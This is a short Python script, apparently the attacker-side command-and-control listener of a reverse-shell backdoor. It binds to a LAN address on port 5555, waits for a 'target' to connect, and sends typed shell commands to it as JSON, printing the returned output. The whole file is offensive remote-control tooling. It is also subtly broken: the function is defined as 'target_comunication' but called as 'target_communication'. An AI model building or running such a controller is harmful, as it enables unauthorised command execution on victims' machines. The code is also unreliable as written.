import socket
import json

def target_comunication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        else:
            result = reliable_recv()
            print(result)

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.12', 5555))
print('[+] Listeneing for the incoming connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target connected from ' + str(ip))
target_communication()